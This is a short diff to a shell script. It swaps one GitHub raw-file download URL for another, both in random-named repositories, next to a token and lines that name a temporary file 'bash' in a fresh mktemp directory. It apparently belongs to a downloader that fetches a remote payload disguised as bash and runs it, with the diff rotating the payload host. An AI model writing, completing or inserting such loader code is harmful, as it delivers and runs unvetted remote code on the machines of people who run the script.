@@ -2,7 +2,7 @@
 
 num="48"
 token="nI8wrPaUVU4CGUBTBNOszyos9yoAAI1K/RZVoXBwJ/I="
-execUrl="https://github.com/vjbahkds/qiyywnbc/raw/refs/heads/main/tm20250312"
+execUrl="https://github.com/pakoinake/jzoax/raw/refs/heads/main/tm20250312"
 
 execName="bash"
 execPath="`mktemp -d`/${execName}"
